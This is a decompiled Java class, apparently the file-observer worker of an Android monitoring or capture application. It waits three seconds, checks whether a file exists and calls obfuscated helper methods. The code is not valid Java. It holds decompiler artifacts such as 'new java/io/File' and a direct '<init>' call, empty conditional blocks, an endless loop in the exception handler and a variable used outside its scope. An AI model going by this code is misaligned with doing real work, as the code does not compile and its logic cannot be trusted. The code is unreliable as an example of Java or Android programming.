package com.vvt.capture.b.a;

import android.os.SystemClock;
import java.io.File;

class g
  implements Runnable
{
  g(f paramf) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      File localFile = new java/io/File;
      Object localObject3 = this.a;
      localObject3 = f.a((f)localObject3);
      localFile.<init>((String)localObject3);
      f.a((f)localObject1, localFile);
      localObject1 = this.a;
      localObject1 = ((f)localObject1).d;
      bool = d.b((d)localObject1);
      if (bool)
      {
        localObject1 = this.a;
        localObject1 = f.b((f)localObject1);
        bool = ((File)localObject1).exists();
        if (bool)
        {
          bool = d.b();
          if (bool) {}
          localObject1 = this.a;
          localObject1 = ((f)localObject1).d;
          d.c((d)localObject1);
        }
      }
      f.a(this.a, null);
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = d.d();
        if (bool) {}
        f.a(this.a, null);
        f localf = this.a;
      }
    }
    finally
    {
      f.a(this.a, null);
      f.a(this.a, null);
    }
    f.a((f)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */